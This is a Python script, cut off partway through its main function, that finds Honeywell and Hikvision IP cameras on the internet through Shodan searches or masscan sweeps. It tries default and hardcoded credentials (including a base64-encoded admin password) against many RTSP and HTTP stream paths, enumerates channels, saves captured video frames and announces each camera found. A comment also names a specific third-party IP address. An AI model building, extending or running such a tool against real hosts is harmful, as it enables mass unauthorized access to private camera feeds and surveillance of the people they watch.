#!/usr/bin/env python3
"""
Honeywell / Hikvision Camera Scanner

Discovers and tests IP cameras using three modes:
  --ip       : Test a single known IP address
  --scan     : Use masscan to find cameras on a network (requires masscan installed)
  --api-key  : Use Shodan API to search for cameras

Requirements:
- Packages: shodan, requests, opencv-python
- Optional: masscan (for --scan mode)
"""

import os
import sys
import time
import argparse
import json
import base64
import re
import socket
import threading
import subprocess
import tempfile
from urllib.parse import urlparse
from collections import defaultdict

import shodan
import requests
import cv2

# List of RTSP URL patterns for Honeywell cameras from references
HONEYWELL_RTSP_PATTERNS = [
    # Most common patterns
    "rtsp://{ip}:{rtsp_port}/h264",
    "rtsp://{ip}:{rtsp_port}/cam{channel}/h264",
    "rtsp://{ip}:{rtsp_port}/cam/realmonitor",
    "rtsp://{ip}:{rtsp_port}/cam/realmonitor?channel={channel}&subtype=01",
    "rtsp://{ip}:{rtsp_port}/live.sdp",
    
    # Hikvision patterns - verified working with several IPs
    "rtsp://{ip}:{rtsp_port}/Streaming/channels/{channel}",
    "rtsp://{ip}:{rtsp_port}/Streaming/channels/0{channel}",  # Format variation
    "rtsp://{ip}:{rtsp_port}/ISAPI/Streaming/channels/{channel}",
    
    # Additional working Hikvision patterns
    "rtsp://{ip}:{rtsp_port}/Streaming/Channels/{channel}01",  # Main stream
    "rtsp://{ip}:{rtsp_port}/Streaming/Channels/{channel}02",  # Sub stream
    "rtsp://{ip}:{rtsp_port}/ISAPI/Streaming/channels/{channel}01",  # Main stream
    "rtsp://{ip}:{rtsp_port}/ISAPI/Streaming/channels/{channel}02",  # Sub stream
    
    # Additional patterns found on 24.76.115.85
    "rtsp://{ip}:{rtsp_port}/mpeg4/ch{channel}/main/av_stream",
    "rtsp://{ip}:{rtsp_port}/mpeg4/ch0{channel}/main/av_stream"
]

# Common channel discovery endpoints
CHANNEL_DISCOVERY_ENDPOINTS = [
    "http://{ip}/device-discovery.cgi",
    "http://{ip}/api/channels",
    "http://{ip}/config/channels.cgi",
    "http://{ip}/system/channels",
    "http://{ip}/cgi-bin/videostream.cgi?list_channel=1",
    "http://{ip}/cgi-bin/status?channels",
    # Add with different ports
    "http://{ip}:{http_port}/device-discovery.cgi",
    "http://{ip}:{http_port}/api/channels",
    "http://{ip}:{http_port}/doc/page/login.asp"  # Common Hikvision/Honeywell login page
]

# Additional auth-requiring patterns to add with our own auth
AUTH_REQUIRING_PATTERNS = [
    "rtsp://{ip}:{rtsp_port}/cam/realmonitor?channel=1&subtype=00"
]

# Patterns with hardcoded auth strings to try exactly as-is
HARDCODED_AUTH_PATTERNS = [
    "rtsp://{ip}:{rtsp_port}/cam/realmonitor?channel=1&subtype=00&authbasic=YWRtaW46QWRtaW4xMjMu"
]

# List of HTTP URL patterns for Honeywell cameras
HONEYWELL_HTTP_PATTERNS = [
    # Most common patterns
    "http://{ip}/img/video.mjpeg",
    "http://{ip}/cgi-bin/jpg/image.cgi",
    "http://{ip}/img/snapshot.cgi?size=3",
    "http://{ip}:{http_port}/doc/page/main.asp",
    "http://{ip}:{http_port}/doc/page/login.asp",
    "http://{ip}:{http_port}/index.asp"
]

# Common RTSP ports to try
COMMON_RTSP_PORTS = [554, 8554, 8000, 8002, 10554, 1935]

# Common HTTP ports for camera interfaces
COMMON_HTTP_PORTS = [80, 8000, 8001, 8080, 8081, 8888]

# Default credentials to try
DEFAULT_CREDENTIALS = [
    {"username": "admin", "password": "12345"}  # Only admin:12345 as requested
]

# Standard HTTP headers to include with requests
HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

# Camera fingerprint signatures for identifying vendor from banners
# All match strings are lowercased for case-insensitive comparison
CAMERA_SIGNATURES = {
    "hikvision": {
        "http_headers": ["hikvision-webs", "dnvrs-webs", "app-webs", "davinci", "hikvision"],
        "http_body": ["hikvision"],
        "rtsp_banner": ["hikvision", "streaming media", "dnvrs"],
        "probe_paths": ["/doc/page/login.asp"],
    },
    "honeywell": {
        "http_headers": ["honeywell"],
        "http_body": ["honeywell"],
        "rtsp_banner": ["honeywell"],
        "probe_paths": ["/img/video.mjpeg", "/cgi-bin/jpg/image.cgi"],
    },
}

# Default ports to scan with masscan (RTSP + HTTP camera ports)
DEFAULT_SCAN_PORTS = "554,8554,80,8080,8000,8001,8081,8888,443"

def ensure_dir(directory):
    """Make sure a directory exists, creating it if necessary"""
    os.makedirs(directory, exist_ok=True)

def check_rtsp_stream(url, timeout=5, save_frames=False, output_dir=None, max_frames=5):
    """Try to connect to an RTSP stream with a hard timeout using threading"""
    try:
        # Do a quick socket check to see if the port is even open first
        # Parse the URL to get host and port
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 554  # Default RTSP port
        
        # Try to connect to the port with a short timeout
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  # Short socket timeout
        
        try:
            s.connect((hostname, port))
            # Port is open, we can try OpenCV
        except (socket.timeout, ConnectionRefusedError, socket.error):
            print(f"Connection to {hostname}:{port} failed - port closed or filtered")
            return False
        finally:
            s.close()
        
        # If we're here, the port is open, so try OpenCV for frames
        # Use a much more strict timeout mechanism
        result = {"success": False, "frames": []}
        
        # Define a function for the thread to run with a timeout
        def capture_thread():
            try:
                # Set OpenCV parameters for faster timeout
                cap = cv2.VideoCapture(url)
                
                # For storing frames
                frames = []
                
                # Try to read frames
                start_time = time.time()
                while time.time() - start_time < timeout and len(frames) < max_frames:
                    ret, frame = cap.read()
                    if ret:
                        frames.append(frame)
                        if not save_frames:  # If not saving frames, one is enough
                            break
                    else:
                        break
                
                cap.release()
                
                result["success"] = len(frames) > 0
                result["frames"] = frames
            except Exception as e:
                print(f"Error in capture thread: {str(e)}")
                result["success"] = False
        
        # Run the capture in a separate thread with a timeout
        thread = threading.Thread(target=capture_thread)
        thread.daemon = True  # Allow the thread to be killed when the program exits
        
        # Start the thread and wait for timeout
        thread.start()
        thread.join(timeout)
        
        # If the thread is still running after timeout, it's taking too long
        if thread.is_alive():
            print(f"Hard timeout reached for {url}")
            return False
        
        # Process the results
        if result["success"] and save_frames and result["frames"] and output_dir:
            try:
                ensure_dir(output_dir)
                
                for i, frame in enumerate(result["frames"]):
                    frame_path = os.path.join(output_dir, f"frame_{i+1}.jpg")
                    success = cv2.imwrite(frame_path, frame)
                    if not success:
                        print(f"Warning: Failed to save frame to {frame_path}")
            except Exception as e:
                print(f"Error saving frames: {str(e)}")
        
        return result["success"]
    
    except Exception as e:
        print(f"Error checking RTSP stream {url}: {str(e)}")
        return False

def check_http_stream(url, timeout=5):
    """Try to connect to an HTTP stream"""
    try:
        response = requests.get(url, timeout=timeout, stream=True, headers=HTTP_HEADERS)
        if response.status_code == 200:
            # Check for common video content types
            content_type = response.headers.get('Content-Type', '')
            if any(x in content_type.lower() for x in ['video', 'image', 'stream', 'mjpeg', 'multipart']):
                return True
        return False
    except Exception as e:
        print(f"Error checking HTTP stream {url}: {str(e)}")
        return False

def encode_basic_auth(username, password):
    """Create Basic authentication string for URL parameters"""
    auth_string = f"{username}:{password}"
    return base64.b64encode(auth_string.encode('utf-8')).decode('utf-8')

def rtsp_banner_grab(ip, port, timeout=3):
    """
    Send an RTSP OPTIONS request and extract the Server header from the response.
    Returns a dict with banner info or None if the port doesn't speak RTSP.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))

        request = f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        s.sendall(request.encode('ascii'))

        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                # RTSP responses end with double CRLF
                if b"\r\n\r\n" in response:
                    break
            except socket.timeout:
                break

        s.close()

        if not response:
            return None

        text = response.decode('ascii', errors='replace')

        # Must look like an RTSP response
        if not text.startswith("RTSP/"):
            return None

        result = {
            "banner": text.split("\r\n")[0],
            "server": "",
            "vendor": "unknown",
        }

        # Extract Server header
        for line in text.split("\r\n"):
            if line.lower().startswith("server:"):
                result["server"] = line.split(":", 1)[1].strip()
                break

        # Match against known signatures
        server_lower = result["server"].lower()
        banner_lower = text.lower()
        for vendor, sigs in CAMERA_SIGNATURES.items():
            for pattern in sigs.get("rtsp_banner", []):
                if pattern in server_lower or pattern in banner_lower:
                    result["vendor"] = vendor
                    return result

        # Valid RTSP but unknown vendor
        return result

    except (socket.timeout, ConnectionRefusedError, OSError):
        return None


def http_fingerprint(ip, port, timeout=3):
    """
    Probe an HTTP port to identify the camera vendor from Server header,
    response body, and known probe paths.
    Returns a dict with fingerprint info or None if not identifiable.
    """
    result = {
        "server": "",
        "vendor": "unknown",
        "matched_path": None,
    }

    # Phase 1: GET / and check Server header + body
    base_url = f"http://{ip}:{port}"
    try:
        resp = requests.get(
            f"{base_url}/",
            timeout=timeout,
            headers=HTTP_HEADERS,
            allow_redirects=True,
            verify=False,
        )
        server_header = resp.headers.get("Server", "")
        result["server"] = server_header
        server_lower = server_header.lower()
        body_lower = resp.text[:4096].lower()

        for vendor, sigs in CAMERA_SIGNATURES.items():
            # Check Server header
            for pattern in sigs.get("http_headers", []):
                if pattern in server_lower:
                    result["vendor"] = vendor
                    return result
            # Check body
            for pattern in sigs.get("http_body", []):
                if pattern in body_lower:
                    result["vendor"] = vendor
                    return result
    except Exception:
        pass

    # Phase 2: Try vendor-specific probe paths
    for vendor, sigs in CAMERA_SIGNATURES.items():
        for path in sigs.get("probe_paths", []):
            try:
                resp = requests.get(
                    f"{base_url}{path}",
                    timeout=timeout,
                    headers=HTTP_HEADERS,
                    allow_redirects=True,
                    verify=False,
                )
                if resp.status_code == 200:
                    body_lower = resp.text[:4096].lower()
                    for body_pattern in sigs.get("http_body", []):
                        if body_pattern in body_lower:
                            result["vendor"] = vendor
                            result["matched_path"] = path
                            return result
                    # Even a 200 on a vendor-specific path is a strong signal
                    if vendor == "hikvision" and path == "/doc/page/login.asp":
                        result["vendor"] = vendor
                        result["matched_path"] = path
                        return result
            except Exception:
                pass

    # Could not identify vendor but port was reachable
    if result["server"]:
        return result
    return None


def fingerprint_host(ip, port, timeout=3):
    """
    Fingerprint a single ip:port to determine if it is a camera and identify the vendor.
    Dispatches to RTSP or HTTP fingerprinting based on port type.
    Returns a dict with ip, port, vendor, type, server/banner or None.
    """
    info = {
        "ip": ip,
        "port": port,
        "vendor": "unknown",
        "type": None,
        "server": "",
        "banner": "",
    }

    if port in COMMON_RTSP_PORTS:
        result = rtsp_banner_grab(ip, port, timeout)
        if result:
            info["type"] = "rtsp"
            info["vendor"] = result.get("vendor", "unknown")
            info["server"] = result.get("server", "")
            info["banner"] = result.get("banner", "")
            return info

    if port in COMMON_HTTP_PORTS or port == 443:
        result = http_fingerprint(ip, port, timeout)
        if result:
            info["type"] = "http"
            info["vendor"] = result.get("vendor", "unknown")
            info["server"] = result.get("server", "")
            if result.get("matched_path"):
                info["banner"] = f"Matched path: {result['matched_path']}"
            return info

    # Port not in known lists -- try both
    result = rtsp_banner_grab(ip, port, timeout)
    if result:
        info["type"] = "rtsp"
        info["vendor"] = result.get("vendor", "unknown")
        info["server"] = result.get("server", "")
        info["banner"] = result.get("banner", "")
        return info

    result = http_fingerprint(ip, port, timeout)
    if result:
        info["type"] = "http"
        info["vendor"] = result.get("vendor", "unknown")
        info["server"] = result.get("server", "")
        return info

    return None


def run_masscan(targets, ports=DEFAULT_SCAN_PORTS, rate=1000, masscan_path="masscan"):
    """
    Run masscan against targets and return a list of {ip, port} dicts.
    targets: CIDR range, single IP, or path to a file containing targets.
    """
    # Build the masscan command
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False, mode="w") as tmp:
        tmp_path = tmp.name

    try:
        cmd = [masscan_path]

        # If targets looks like a file path, use -iL
        if os.path.isfile(targets):
            cmd.extend(["-iL", targets])
        else:
            cmd.append(targets)

        cmd.extend([
            "-p", str(ports),
            "--rate", str(rate),
            "-oJ", tmp_path,
            "--wait", "3",
        ])

        print(f"Running masscan: {' '.join(cmd)}")
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
        )

        if proc.returncode != 0 and proc.returncode != 1:
            # masscan returns 1 when it finds hosts, 0 when no hosts found
            stderr = proc.stderr.strip()
            if "FAIL" in stderr or "not found" in stderr.lower() or "errno" in stderr.lower():
                print(f"masscan error: {stderr}")
                return []

        # Parse the JSON output
        # masscan JSON has a trailing comma bug: [{...},{...},]
        try:
            with open(tmp_path, "r") as f:
                raw = f.read().strip()
        except FileNotFoundError:
            print("masscan produced no output file")
            return []

        if not raw:
            print("masscan returned no results")
            return []

        # Fix trailing commas that masscan leaves in the JSON
        raw = raw.replace(",\n]", "\n]").replace(",]", "]").replace(",\n}", "\n}")
        # masscan sometimes wraps output differently; handle both array and bare
        if not raw.startswith("["):
            raw = "[" + raw + "]"

        try:
            data = json.loads(raw)
        except json.JSONDecodeError as e:
            print(f"Failed to parse masscan JSON: {e}")
            # Try line-by-line as fallback
            data = []
            for line in raw.split("\n"):
                line = line.strip().rstrip(",")
                if line.startswith("{"):
                    try:
                        data.append(json.loads(line))
                    except json.JSONDecodeError:
                        pass

        results = []
        seen = set()
        for entry in data:
            ip = entry.get("ip")
            for port_info in entry.get("ports", []):
                port = port_info.get("port")
                if ip and port:
                    key = (ip, port)
                    if key not in seen:
                        seen.add(key)
                        results.append({"ip": ip, "port": port})

        print(f"masscan found {len(results)} open port(s) across {len(set(r['ip'] for r in results))} host(s)")
        return results

    except FileNotFoundError:
        print(f"Error: masscan not found at '{masscan_path}'")
        print("Install masscan: sudo apt install masscan  (or download from https://github.com/robertdavidgraham/masscan)")
        return []
    except Exception as e:
        print(f"Error running masscan: {e}")
        return []
    finally:
        # Clean up temp file
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def detect_camera_ports(camera_data):
    """
    Analyze Shodan data to detect the appropriate ports for HTTP and RTSP.
    Handles both single search match results and host-level data structures.
    Returns a dictionary with rtsp_port and http_port.
    """
    ports = {
        "rtsp_port": 554,  # Default RTSP port
        "http_port": 80    # Default HTTP port
    }
    
    if not camera_data or not isinstance(camera_data, dict):
        return ports
    
    # Get the raw Shodan match data (stored under 'data' key by search_shodan)
    match = camera_data.get('data')
    
    # Handle single Shodan search match (dict with 'port', '_shodan', etc.)
    if isinstance(match, dict):
        match_port = match.get('port')
        module = match.get('_shodan', {}).get('module', '')
        banner = str(match.get('data', '')).lower()
        
        if match_port:
            if module == 'rtsp' or 'rtsp' in banner or match_port in COMMON_RTSP_PORTS:
                ports['rtsp_port'] = match_port
                print(f"Detected RTSP port from Shodan match: {match_port}")
            elif module in ('http', 'https') or 'http' in banner or match_port in COMMON_HTTP_PORTS:
                ports['http_port'] = match_port
                print(f"Detected HTTP port from Shodan match: {match_port}")
    
    # Handle host-level data (list of service entries from api.host())
    elif isinstance(match, list):
        for data_item in match:
            if not isinstance(data_item, dict):
                continue
            item_port = data_item.get('port')
            if not item_port:
                continue
            
            item_module = data_item.get('_shodan', {}).get('module', '')
            item_banner = str(data_item.get('data', '')).lower()
            
            if item_module == 'rtsp' or 'rtsp' in item_banner or item_port in COMMON_RTSP_PORTS:
                ports['rtsp_port'] = item_port
                print(f"Detected likely RTSP port: {item_port}")
            elif (item_module in ('http', 'https') or 'http' in item_banner
                  or item_port in COMMON_HTTP_PORTS):
                ports['http_port'] = item_port
                print(f"Detected likely HTTP port: {item_port}")
    
    # Fallback: check the available port list from the camera dict
    all_ports = camera_data.get('ports', [])
    if isinstance(all_ports, list):
        if ports["rtsp_port"] == 554:
            for port in all_ports:
                if port in COMMON_RTSP_PORTS:
                    ports["rtsp_port"] = port
                    print(f"Using common RTSP port found in available ports: {port}")
                    break
        
        if ports["http_port"] == 80:
            for port in all_ports:
                if port in COMMON_HTTP_PORTS:
                    ports["http_port"] = port
                    print(f"Using common HTTP port found in available ports: {port}")
                    break
    
    return ports

def test_camera_urls(ip, channel, credentials, save_frames=False, rtsp_port=None, http_port=None, auto_detect=True, timeout=5):
    """Test various URL patterns for a camera"""
    results = []
    
    # Build URL patterns to test with credentials and channel info
    patterns = []
    
    # Determine the RTSP and HTTP ports to use for pattern formatting
    fmt_rtsp_port = rtsp_port if rtsp_port else 554
    fmt_http_port = http_port if http_port else 80

    # Include hardcoded auth patterns exactly as they are
    for pattern in HARDCODED_AUTH_PATTERNS:
        patterns.append(pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port))
    
    # Add RTSP patterns for each credential
    for cred in credentials:
        username = cred["username"]
        password = cred["password"]
        
        # Test basic patterns with credentials if needed
        for pattern in HONEYWELL_RTSP_PATTERNS:
            auth_url = pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port)
            # Add authenticated URL if pattern doesn't already include auth
            if "user=" not in pattern and "password=" not in pattern and "authbasic=" not in pattern:
                auth_url = auth_url.replace("rtsp://", f"rtsp://{username}:{password}@")
            patterns.append(auth_url)
        
        # Add patterns requiring auth
        for pattern in AUTH_REQUIRING_PATTERNS:
            auth_pattern = pattern.format(ip=ip, channel=channel, rtsp_port=fmt_rtsp_port)
            # Add authentication
            encoded_auth = encode_basic_auth(username, password)
            auth_pattern = auth_pattern + f"&authbasic={encoded_auth}"
            patterns.append(auth_pattern)
    
    # Add additional RTSP URL patterns for Honeywell cameras
    patterns.extend([
        f"rtsp://{ip}:554/h264/ch{channel}/main/av_stream",
        f"rtsp://{ip}:554/Streaming/Channels/{channel}01",
        f"rtsp://{ip}:554/ch{channel}/main/av_stream",
        f"rtsp://{ip}:554/live/ch{channel}"
    ])
    
    # Add HTTP URL patterns
    http_patterns = []
    for pattern in HONEYWELL_HTTP_PATTERNS:
        http_patterns.append(pattern.format(ip=ip, channel=channel, http_port=fmt_http_port))
    
    # Add port variations if auto_detect is enabled
    if auto_detect:
        # If RTSP port is custom, use only that port for RTSP
        rtsp_ports = [554]  # Default RTSP port
        if rtsp_port:
            rtsp_ports = [rtsp_port]
        else:
            # Common RTSP ports for Honeywell cameras
            rtsp_ports = COMMON_RTSP_PORTS
        
        # If HTTP port is custom, use only that port for HTTP
        http_ports = [80]  # Default HTTP port
        if http_port:
            http_ports = [http_port]
        else:
            # Common HTTP ports for Honeywell cameras
            http_ports = COMMON_HTTP_PORTS
    else:
        # Use only the specified ports or defaults
        rtsp_ports = [rtsp_port or 554]
        http_ports = [http_port or 80]
    
    # Test RTSP URLs with different ports
    for port in rtsp_ports:
        for pattern in patterns:
            # Replace default port with the current port
            url = pattern.replace(':554/', f':{port}/')
            
            # Skip if the URL doesn't start with the right protocol
            if not url.startswith("rtsp://"):
                continue
            
            print(f"Testing {url}...")
            success = check_rtsp_stream(url, timeout=timeout, save_frames=save_frames, output_dir=f"captures/{ip}")
            
            if success:
                results.append(f"[OK] Working URL: {url}")
            else:
                results.append(f"[FAIL] Failed: {url}")
    
    # Test HTTP URLs with different ports
    for port in http_ports:
        for pattern in http_patterns:
            # Check if pattern includes a port already
            if ':' in pattern.split('/')[2]:
                # Replace existing port
                url = re.sub(r':(\d+)', f':{port}', pattern)
            else:
                # Add port
                url = pattern.replace(f'{ip}/', f'{ip}:{port}/')
            
            # Skip if the URL doesn't start with the right protocol
            if not url.startswith("http://") and not url.startswith("https://"):
                continue
            
            print(f"Testing {url}...")
            success = check_http_stream(url, timeout=timeout)
            
            if success:
                results.append(f"[OK] Working URL: {url}")
            else:
                results.append(f"[FAIL] Failed: {url}")
    
    return results

def search_shodan(api_key, limit=100, custom_query=None, page=1):
    """
    Search Shodan for cameras and related devices using the specified query or default to Honeywell cameras
    Supports pagination through the page parameter
    """
    api = shodan.Shodan(api_key)
    
    # Use custom query if provided, otherwise use default Honeywell query
    query = custom_query if custom_query else 'port:554 product:"Honeywell"'
    
    print(f"Executing Shodan search query: {query} (Page {page}, Limit {limit})")
    
    try:
        # Search Shodan with pagination
        results = api.search(query, limit=limit, page=page)
        
        print(f"Found {results['total']} total results (showing page {page})")
        cameras = []
        
        for result in results['matches']:
            ip = result['ip_str']
            ports = result.get('ports', [])
            
            cameras.append({
                'ip': ip,
                'hostnames': result.get('hostnames', []),
                'org': result.get('org', 'N/A'),
                'ports': ports,
                'data': result
            })
        
        return cameras
        
    except shodan.APIError as e:
        print(f"Error: {e}")
        return []

def enumerate_camera_channels(ip, credentials=None, http_port=80, rtsp_port=554):
    """
    Attempt to discover camera name and available channels using various methods
    Returns a dictionary with camera_name and available_channels
    """
    if credentials is None:
        credentials = DEFAULT_CREDENTIALS
        
    print(f"\nAttempting to enumerate camera name and channels for {ip}...")
    
    result = {
        "camera_name": None,
        "available_channels": [],
        "max_channels_found": 0
    }
    
    # First, try to get device information through HTTP endpoints
    channel_pattern = re.compile(r'channel[_\s]?(count|num|number|available)[_\s:=]?[\'"]?(\d+)', re.IGNORECASE)
    name_pattern = re.compile(r'(camera|device)[_\s]?name[_\s:=]?[\'"]?([A-Za-z0-9\-_\s]+)', re.IGNORECASE)
    
    # Try device info endpoints
    for endpoint in CHANNEL_DISCOVERY_ENDPOINTS:
        url = endpoint.format(ip=ip, http_port=http_port)
        for cred in credentials:
            auth = (cred["username"], cred["password"])
            try:
                print(f"Trying to get channel info from {url}")
                response = requests.get(url, auth=auth, timeout=5, headers=HTTP_HEADERS)
                
                if response.status_code == 200:
                    try:
                        # Try to parse as JSON first
                        data = response.json()
                        
                        # Look for channel information in JSON
                        if isinstance(data, dict):
                            # Check common JSON structures for channel info
                            if "channels" in data:
                                channels = data["channels"]
                                if isinstance(channels, list):
                                    result["available_channels"] = [ch.get("id", i) for i, ch in enumerate(channels, 1)]
                                    result["max_channels_found"] = len(channels)
                                    print(f"Found {len(channels)} channels via JSON data")
                            
                            # Look for camera name in JSON
                            if "name" in data:
                                result["camera_name"] = data["name"]
                            elif "deviceName" in data:
                                result["camera_name"] = data["deviceName"]
                            
                    except (ValueError, json.JSONDecodeError):
                        # Not JSON, treat as text
                        # Look for channel count in response text
                        channel_match = channel_pattern.search(response.text)
                        if channel_match:
                            try:
                                channel_count = int(channel_match.group(2))
                                result["max_channels_found"] = channel_count
                                result["available_channels"] = list(range(1, channel_count + 1))
                                print(f"Found {channel_count} channels via regex")
                            except ValueError:
                                pass
                        
                        # Look for camera name in response text  
                        name_match = name_pattern.search(response.text)
                        if name_match:
                            result["camera_name"] = name_match.group(2).strip()
            except Exception as e:
                print(f"Error accessing {url}: {str(e)}")
    
    # If we still don't have channels, try probing common channel numbers
    if not result["available_channels"]:
        # If we couldn't find channels through API, try connection tests
        print("Attempting to discover channels through RTSP connection tests...")
        
        # Try channels 1-4 (common for residential cameras) and additional special channels
        # Also test high channel numbers like 101, 102 (found working with Hikvision cameras)
        channels_to_test = list(range(1, 5)) + [101, 102]
        working_channels = []
        
        # Use patterns that includes channel parameter
        channel_patterns = [
            "rtsp://{ip}:{rtsp_port}/cam{channel}/h264",
            "rtsp://{ip}:{rtsp_port}/Streaming/channels/{channel}"
        ]
        
        for channel in channels_to_test:
            for pattern in channel_patterns:
                url = pattern.format(ip=ip, channel=channel, rtsp_port=rtsp_port)
                
                # Quick test with first credential
                auth = f"{credentials[0]['username']}:{credentials[0]['password']}@"
                auth_url = url.replace("://", f"://{auth}")
                
                print(f"Testing channel {channel} with {pattern}: {auth_url}")
                if check_rtsp_stream(auth_url):
                    working_channels.append(channel)
                    print(f"[SUCCESS] Channel {channel} is available")
                    break  # Move to next channel after finding a working URL
                else:
                    print(f"[FAILED] Channel {channel} not available with this pattern")
        
        if working_channels:
            result["available_channels"] = working_channels
            result["max_channels_found"] = max(working_channels)
            print(f"Found {len(working_channels)} working channels through RTSP probing")
    
    # Summary
    if result["camera_name"]:
        print(f"Camera Name: {result['camera_name']}")
    else:
        print("Camera name could not be determined")
        
    if result["available_channels"]:
        print(f"Available Channels: {result['available_channels']}")
    else:
        print("No channels could be enumerated, will try with default channel 1")
        result["available_channels"] = [1]  # Default to channel 1
    
    return result

# Add a function to play a notification sound when a working camera is found
def play_notification_sound():
    """Play a notification sound to alert that a working camera was found"""
    try:
        # Different approaches depending on the platform
        if sys.platform.startswith('linux'):
            # Use system beep on Linux
            sys.stdout.write('\a')
            sys.stdout.flush()
            # Also try to use the 'spd-say' command which is available on many Linux distributions
            os.system("spd-say 'Camera found' &")
        elif sys.platform == 'darwin':  # macOS
            os.system("afplay /System/Library/Sounds/Ping.aiff &")
        elif sys.platform == 'win32':  # Windows
            import winsound
            winsound.Beep(1000, 1000)  # Frequency 1000, duration 1000ms
        
        # Additional sound using print with special character - works on most terminals
        print("\n\007\007\007")  # \007 is the ASCII bell character
        print("\n** CAMERA FOUND! **\n")
    except Exception as e:
        print(f"Could not play notification sound: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='Scan for cameras and test RTSP streams')
    parser.add_argument('--api-key', '-k', help='Shodan API key (required for Shodan searches)')
    parser.add_argument('--limit', '-l', type=int, default=100, help='Limit search results (default: 100)')
    parser.add_argument('--channel', '-c', type=int, default=1, help='Camera channel to test (default: 1)')
    parser.add_argument('--ip', '-i', help='Test a specific IP address instead of searching Shodan')
    parser.add_argument('--credentials', help='Path to JSON file with credentials to try (default: admin:12345)')
    parser.add_argument('--save-frames', '-s', action='store_true', help='Save 5 frames from each working camera')
    parser.add_argument('--output-list', '-o', help='Save list of working cameras to this file (default: working_cameras.txt)')
    parser.add_argument('--timeout', '-t', type=int, default=5, help='Timeout in seconds for connection attempts (default: 5)')
    parser.add_argument('--query', '-q', help='Custom Shodan search query')
    parser.add_argument('--page', type=int, default=1, help='Shodan results page number (default: 1)')
    parser.add_argument('--enum-channels', '-e', action='store_true', help='Try to enumerate camera channels (default: False)')
    parser.add_argument('--result-file', help='Save results to this file (default: camera_results_[IP].txt)')
    parser.add_argument('--until-success', action='store_true', help='Stop after finding first working camera')
    parser.add_argument('--rtsp-port', type=int, help='Custom RTSP port to use')
    parser.add_argument('--http-port', type=int, help='Custom HTTP port to use')
    parser.add_argument('--auto-detect-ports', action='store_true', help='Automatically detect ports (default)')
    parser.add_argument('--notify', action='store_true', help='Play notification sound when camera found')

    # Masscan mode arguments
    parser.add_argument('--scan', help='Scan targets with masscan (CIDR, IP, or file of targets)')
    parser.add_argument('--rate', type=int, default=1000, help='Masscan packet rate (default: 1000)')
    parser.add_argument('--masscan-path', default='masscan', help='Path to masscan binary (default: masscan)')
    parser.add_argument('--ports', default=DEFAULT_SCAN_PORTS,
                        help=f'Ports to scan with masscan (default: {DEFAULT_SCAN_PORTS})')

    args = parser.parse_args()
    
    # Create organized directory structure
    base_dir = os.path.dirname(os.path.abspath(__file__))
    logs_dir = os.path.join(base_dir, "logs")
    captures_dir = os.path.join(base_dir, "captures")
    
    # Ensure the directories exist
    ensure_dir(logs_dir)
    ensure_dir(captures_dir)
    
    # Load credentials if specified
    credentials = DEFAULT_CREDENTIALS
    if args.credentials:
        try:
            with open(args.credentials, 'r') as f:
                credentials = json.load(f)
        except Exception as e:
            print(f"Error loading credentials from {args.credentials}: {str(e)}")
            print("Using default credential (admin:12345)")
    
    # Initialize list for working cameras
    working_ips = []
    
    # Scanning a specific IP address
    if args.ip:
        print(f"Testing camera at {args.ip}...")
        
        # Get camera name and available channels
        channels_to_test = [args.channel]  # Default to specified channel
        camera_info = {}
        
        if args.enum_channels:
            camera_info = enumerate_camera_channels(args.ip, credentials)
            if camera_info["available_channels"]:
                channels_to_test = camera_info["available_channels"]
                print(f"Will test the following channels: {channels_to_test}")
        
        # Set ports if provided
        rtsp_port = None
        http_port = None
        
        if args.rtsp_port:
            rtsp_port = args.rtsp_port
            print(f"Using RTSP port: {rtsp_port}")
        
        if args.http_port:
            http_port = args.http_port
            print(f"Using HTTP port: {http_port}")
        
        all_results = []
        for channel in channels_to_test:
            print(f"\nTesting channel {channel}...")
            results = test_camera_urls(args.ip, channel, credentials, args.save_frames, 
                                      rtsp_port=rtsp_port, http_port=http_port, 
                                      auto_detect=args.auto_detect_ports,
                                      timeout=args.timeout)
            all_results.extend(results)
            
            # Check if any URL works for this camera
            if any("[OK]" in result for result in results):
                if args.ip not in working_ips:
                    working_ips.append(args.ip)
                
                # Play notification sound if enabled
                if args.notify:
                    play_notification_sound()

                # If --until-success flag is set, break after finding first working camera
                if args.until_success:
                    break
        
        # Results file handling
        if args.result_file:
            result_filename = args.result_file
        else:
            result_filename = f"camera_results_{args.ip}.txt"
        
        # Check for logs directory
        if os.path.dirname(result_filename) == '':
            # No directory specified, use logs
            result_filename = os.path.join("logs", result_filename)
        
        # Ensure logs directory exists
        ensure_dir(os.path.dirname(result_filename))
        
        with open(result_filename, 'w', encoding='utf-8') as f:
            # Write camera name/channel info
            f.write(f"Camera: {args.ip}\n")
            f.write(f"Camera Name: {camera_info.get('camera_name', 'Unknown')}\n")
            f.write(f"Available Channels: {camera_info.get('available_channels', channels_to_test)}\n\n")
            
            # Write results
            for result in all_results:
                f.write(f"{result}\n")
                print(result)
    
    # Masscan scan mode
    elif args.scan:
        print(f"Starting masscan scan against: {args.scan}")
        print(f"Ports: {args.ports} | Rate: {args.rate}")

        # Phase 1: Run masscan to discover open ports
        scan_results = run_masscan(
            args.scan,
            ports=args.ports,
            rate=args.rate,
            masscan_path=args.masscan_path,
        )

        if not scan_results:
            print("No open ports found by masscan")
            sys.exit(2)

        # Phase 2: Fingerprint each discovered ip:port
        print(f"\nFingerprinting {len(scan_results)} open port(s)...")
        cameras_by_ip = defaultdict(lambda: {"ports": {}, "vendor": "unknown"})

